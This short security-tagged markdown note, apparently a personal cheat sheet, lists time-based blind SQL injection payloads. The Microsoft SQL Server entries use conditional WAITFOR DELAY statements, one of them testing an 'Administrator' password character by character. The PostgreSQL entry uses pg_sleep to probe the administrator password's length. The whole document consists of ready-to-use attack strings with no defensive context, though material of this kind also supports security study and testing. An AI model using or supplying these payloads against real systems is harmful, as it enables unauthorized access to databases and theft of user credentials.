---
tags:
  - security
---
# Microsoft SQL Server
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
- Delay of 10 seconds
# PostgreSQL
```
SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) > 1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM USERS--
```